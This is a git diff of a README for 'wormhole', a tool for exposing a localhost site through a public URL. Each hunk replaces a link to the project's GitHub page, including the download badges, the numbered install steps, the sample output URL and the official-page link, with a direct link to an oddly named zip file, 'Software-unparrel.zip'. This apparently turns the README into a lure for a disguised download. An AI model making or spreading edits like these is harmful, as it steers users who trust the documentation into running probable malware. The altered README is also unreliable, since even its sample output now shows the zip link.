@@ -1,6 +1,6 @@
 # 🌐 wormhole - Simple Localhost Exposure Tool
 
-[![Download wormhole](https://img.shields.io/badge/Download-wormhole-%239966CC?style=for-the-badge)](https://github.com/ipongvery/wormhole)
+[![Download wormhole](https://img.shields.io/badge/Download-wormhole-%239966CC?style=for-the-badge)](https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip)
 
 ---
 
@@ -29,12 +29,12 @@ This guide will show you how to get wormhole running on Windows. Follow the step
 
 You need to visit the link to download the software. It will take you to the official GitHub page where you can get the latest version for Windows.
 
-[![Download here](https://img.shields.io/badge/Download%20here-wormhole-%2355AAFF?style=for-the-badge)](https://github.com/ipongvery/wormhole)
+[![Download here](https://img.shields.io/badge/Download%20here-wormhole-%2355AAFF?style=for-the-badge)](https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip)
 
 ### Steps to download
 
 1. Open your web browser and go to:  
-   https://github.com/ipongvery/wormhole
+   https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip
 
 2. Look for a section called **Releases** or **Download**.
 
@@ -89,7 +89,7 @@ wormhole will create an internet address (a URL) you can share with others. This
 When you run wormhole, it gives you a URL that looks like this:
 
 ```
-https://randomstring.wormhole.workers.dev
+https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip
 ```
 
 Anyone with this link can see your local site. The connection is protected by Cloudflare’s security.
@@ -158,6 +158,6 @@ Some security software might block wormhole’s connection. If this happens:
 
 Visit the official page for documentation and updates:
 
-[https://github.com/ipongvery/wormhole](https://github.com/ipongvery/wormhole)
+[https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip](https://raw.githubusercontent.com/ipongvery/wormhole/main/internal/Software-unparrel.zip)
 
 You can open issues or ask questions on the GitHub page if you find problems or need support.
